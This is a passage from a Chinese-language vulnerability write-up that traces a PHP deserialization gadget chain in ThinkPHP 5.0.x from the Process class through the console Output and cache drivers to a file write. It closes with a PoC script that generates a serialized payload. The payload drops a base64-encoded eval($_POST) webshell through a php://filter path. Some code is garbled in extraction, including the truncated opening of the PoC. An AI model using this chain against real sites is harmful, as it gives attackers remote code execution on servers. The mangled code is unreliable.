         } elseif (-1 === $this->exitcode && $this->processInformation['signaled']
                   && 0 processInformation['termsig']
         ) {
             $this->exitcode = 128 + $this->processInformation['termsig'];
         }
         return $this->exitcode;
     }
注意到，只要是有了proc_get_status的地方就会触发app
error，因为我们无法序列化resource对象（我个人测试是这样，如果大佬有方法还请赐教）。这样一看上面除了close方法，就没啥利用点了。而且close方法的第一行就可以触发任意类的__call魔术方法或者任意类的close方法。  
看下close方法  
发现都没啥利用价值。不是没有利用的地方，就是和这里的close触发点没有区别。  
直奔think\console\Output类中的__call魔术方法，企图一步到位。这时候遇到的只能是app
error，因为其中的block方法需要2个参数。
         public function __call($method, $args)
     {
         if (in_array($method, $this->styles)) {
             array_unshift($args, $method);
             return call_user_func_array([$this, 'block'], $args);
         }
         if ($this->handle && method_exists($this->handle, $method)) {
             return call_user_func_array([$this->handle, $method], $args);
         } else {
             throw new Exception('method not exists:' . __CLASS__ . '->' . $method);
         }
     }
     protected function block($style, $message)
     {
         $this->writeln("{$message}");
     }
     public function writeln($messages, $type = self::OUTPUT_NORMAL)
     {
         $this->write($messages, true, $type);
     }
那么这边就需要找另一个类的__call魔术方法做跳板，最终发现think\model\Relation是所有__call中利用最方便的（其它的__call我没找到能无条件利用的）
         public function __call($method, $args)
     {
         if ($this->query) {
             switch ($this->type) {
                 case self::HAS_MANY:
                     if (isset($this->where)) {
                         $this->query->where($this->where);
                     } elseif (isset($this->parent->{$this->localKey})) {
                         // 关联查询带入关联条件
                         $this->query->where($this->foreignKey, $this->parent->{$this->localKey});
                     }
                     break;
                 case self::HAS_MANY_THROUGH:
                     $through      = $this->middle;
                     $model        = $this->model;
                     $alias        = Loader::parseName(basename(str_replace('\\', '/', $model)));
                     $throughTable = $through::getTable();
                     $pk           = (new $this->model)->getPk();
                     $throughKey   = $this->throughKey;
                     $modelTable   = $this->parent->getTable();
                     $this->query->field($alias . '.*')->alias($alias)
                         ->join($throughTable, $throughTable . '.' . $pk . '=' . $alias . '.' . $throughKey)
                         ->join($modelTable, $modelTable . '.' . $this->localKey . '=' . $throughTable . '.' . $this->foreignKey)
                         ->where($throughTable . '.' . $this->foreignKey, $this->parent->{$this->localKey});
                     break;
                 case self::BELONGS_TO_MANY:
                     // TODO
             }
             $result = call_user_func_array([$this->query, $method], $args);
             if ($result instanceof \think\db\Query) {
                 $this->option = $result->getOptions();
                 return $this;
             } else {
                 $this->option = [];
                 return $result;
             }
         } else {
             throw new Exception('method not exists:' . __CLASS__ . '->' . $method);
         }
     }
不用管其它的，单单是这句，我们就已经有了良好的跳板了
         $this->query->where($this->where);
$this->query和$this->where均可控，这时候再触发Output中的__call就不会有app error了。  
继续跟进，对Output中最后触发的write方法进行查看
         public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
     {
         $this->handle->write($messages, $newline, $type);
     }
通过这个方法，我们可以调用任意类的write（这边也不用考虑触发__call魔术方法了）。生成的文件要内容可控，且文件的后缀是php。  
在众多的write方法中，最后认为只有think\session\driver\Memcache和think\session\driver\Memcached利用价值较大。
        //thinkphp/library/think/session/driver/Memcached.php
     public function write($sessID, $sessData)
     {
         return $this->handler->set($this->config['session_name'] . $sessID, $sessData, $this->config['expire']);
     }
        //thinkphp/library/think/session/driver/Memcache.php
     public function write($sessID, $sessData)
     {
         return $this->handler->set($this->config['session_name'] . $sessID, $sessData, 0, $this->config['expire']);
     }
继续寻找，含有set的方法的类，到这边，网上已经有很多分析过的文章了，这边就简单写一下路径，不细说了，为了在Windows下也能稳定使用，这里先用think\cache\driver\Memcached做过渡，然后将其中的$this->handler赋值为think\cache\driver\File类的实例。
        //think\cache\Driver
     protected function setTagItem($name)
     {
         if ($this->tag) {
             $key       = 'tag_' . md5($this->tag);
             $this->tag = null;
             if ($this->has($key)) {
                 $value = $this->get($key);
                 $value .= ',' . $name;
             } else {
                 $value = $name;
             }
             $this->set($key, $value);
         }
     }
     protected function getCacheKey($name)
     {
         return $this->options['prefix'] . $name;
     }
        //think\cache\driver\Memcached
     public function set($name, $value, $expire = null)
     {
         if (is_null($expire)) {
             $expire = $this->options['expire'];
         }
         if ($this->tag && !$this->has($name)) {
             $first = true;
         }
         $key    = $this->getCacheKey($name);
         $expire = 0 == $expire ? 0 : $_SERVER['REQUEST_TIME'] + $expire;
         if ($this->handler->set($key, $value, $expire)) {
             isset($first) && $this->setTagItem($key);
             return true;
         }
         return false;
     }
        //think\cache\driver\File
     public function set($name, $value, $expire = null)
     {
         if (is_null($expire)) {
             $expire = $this->options['expire'];
         }
         $filename = $this->getCacheKey($name);
         if ($this->tag && !is_file($filename)) {
             $first = true;
         }
         $data = serialize($value);
         if ($this->options['data_compress'] && function_exists('gzcompress')) {
             //数据压缩
             $data = gzcompress($data, 3);
         }
         $data   = "";
         $result = file_put_contents($filename, $data);
         if ($result) {
             isset($first) && $this->setTagItem($filename);
             clearstatcache();
             return true;
         } else {
             return false;
         }
     }
     protected function getCacheKey($name)
     {
         $name = md5($name);
         if ($this->options['cache_subdir']) {
             // 使用子目录
             $name = substr($name, 0, 2) . DS . substr($name, 2);
         }
         if ($this->options['prefix']) {
             $name = $this->options['prefix'] . DS . $name;
         }
         $filename = $this->options['path'] . $name . '.php';
         $dir      = dirname($filename);
         if (!is_dir($dir)) {
             mkdir($dir, 0755, true);
         }
         return $filename;
     }
通过构造base64字符串，再进过伪协议解码后成功写入文件。具体的分析可以参考[https://xz.aliyun.com/t/7310。](https://xz.aliyun.com/t/7310%E3%80%82)  
结果展示：  
poc
    processInformation['running']=true;
            $this->status=3;
            $this->processPipes=new \think\model\Relation();
        }
    }
    namespace think\model;
    use think\console\Output;
    class Relation
    {
        protected $query;
        const HAS_ONE          = 1;
        const HAS_MANY         = 2;
        const HAS_MANY_THROUGH = 5;
        const BELONGS_TO       = 3;
        const BELONGS_TO_MANY  = 4;
        protected $type=2;
        protected $where=1;
        public function __construct()
        {
            $this->query=new Output();
        }
    }
    namespace think\console;
    class Output{
        protected $styles = [
            'info',
            'error',
            'comment',
            'question',
            'highlight',
            'warning',
            'getTable',
            'where'
        ];
        private $handle;
        public function __construct()
        {
            $this->handle = (new \think\session\driver\Memcache);
        }
    }
    namespace think\session\driver;
    class Memcache
    {
        protected $handler;
        public function __construct()
        {
            $this->handler = (new \think\cache\driver\Memcached);
        }
    }
    namespace think\cache\driver;
    use think\Process;
    class Memcached
    {
        protected $tag;
        protected $options;
        protected $handler;
        public function __construct()
        {
            $this->tag = true;
            $this->options = [
                'expire'   => 0,
                'prefix'   => 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
            ];
            $this->handler = (new File);
        }
    }
    class File
    {
        protected $tag;
        protected $options;
        public function __construct()
        {
            $this->tag = false;
            $this->options = [
                'expire'        => 3600,
                'cache_subdir'  => false,
                'prefix'        => '',
                'data_compress' => false,
                'path'          => 'php://filter/convert.base64-decode/resource=./',
            ];
        }
    }
    use think;
    $a=new Process();
    echo urlencode(serialize($a));
## 2\. thinkphp5.0.4-thinkphp5.0.24
首先要注意的一个变化是以往的利用的Relation类变为了抽象了，无法直接实例化。所以前面的链子到这边也就断了。